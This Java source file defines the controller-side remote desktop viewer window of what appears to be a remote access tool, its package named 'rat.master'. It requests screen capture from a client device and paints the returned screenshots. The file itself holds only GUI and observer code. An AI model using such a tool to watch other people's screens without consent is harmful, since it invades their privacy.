package rat.master.gui.frames;

import rat.master.MasterMain;
import rat.packets.DesktopDataPacket;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class RemoteDesktopGUI extends JFrame {

    private static int frameCount;
    private int frameId = ++frameCount;

    private String deviceName;
    private int desktopJobId; // given by client

    private List<RemoteDesktopGUIObserver> observerList = new ArrayList<>();

    private JPanel imagePanel = new JPanel();

    public RemoteDesktopGUI(String deviceName) {
        setLocationRelativeTo(null);
        setMinimumSize(new Dimension(300, 300));
        initGUI();

        this.deviceName = deviceName;
    }

    private void initGUI() {
        JPanel mainPanel = new JPanel(new BorderLayout());
        setContentPane(mainPanel);

        JButton btn = new JButton("start");
        btn.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent actionEvent) {
                System.out.println("Sending" + imagePanel.getWidth() + " " + imagePanel.getHeight());
                startDesktopRecord(deviceName, imagePanel.getWidth(), imagePanel.getWidth());
            }
        });

        addComponentListener(new ComponentAdapter() {
            @Override
            public void componentResized(ComponentEvent componentEvent) {
                MasterMain.getExecutor().submit(() -> {
                    notifyCharacteristicsChanged();
                });
            }
        });

        mainPanel.add(btn, BorderLayout.NORTH);

        mainPanel.add(imagePanel, BorderLayout.CENTER);
    }

    public void displayImagePacket(DesktopDataPacket imgPacket) {
        byte[] screenshotBytes = imgPacket.getImageData();
        ByteArrayInputStream inb = new ByteArrayInputStream(screenshotBytes);
        Graphics gb = imagePanel.getGraphics();

        try {
            BufferedImage buffimg = ImageIO.read(inb);
            gb.drawImage(buffimg, 0, 0, null);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void register(RemoteDesktopGUIObserver observer) {
        if (!observerList.contains(Objects.requireNonNull(observer))) {
            observerList.add(Objects.requireNonNull(observer));
        }
    }

    public void unregister(RemoteDesktopGUIObserver observer) {
        observerList.remove(observer);
    }

    public int getFrameId() {
        return frameId;
    }

    public int getDesktopJobId() {
        return desktopJobId;
    }

    public void setDesktopJobId(int desktopJobId) {
        this.desktopJobId = desktopJobId;
    }

    private void startDesktopRecord(String deviceName, int frameWidth, int frameHeight) {
        List<RemoteDesktopGUIObserver> tmp = new ArrayList<>(observerList);
        for (RemoteDesktopGUIObserver observer : tmp) {
            observer.startRemoteDesktopRecord(frameId, deviceName, frameWidth, frameHeight);
        }
    }

    private void stopDesktopRecord() {
        List<RemoteDesktopGUIObserver> tmp = new ArrayList<>(observerList);
        for (RemoteDesktopGUIObserver observer : tmp) {
            observer.stopRemoteDesktopRecord(frameId);
        }
    }

    private void notifyCharacteristicsChanged() {
        List<RemoteDesktopGUIObserver> tmp = new ArrayList<>(observerList);
        for (RemoteDesktopGUIObserver observer : tmp) {
            observer.remoteDesktopSettingsUpdated(desktopJobId, imagePanel.getWidth(), imagePanel.getHeight());
        }
    }
}
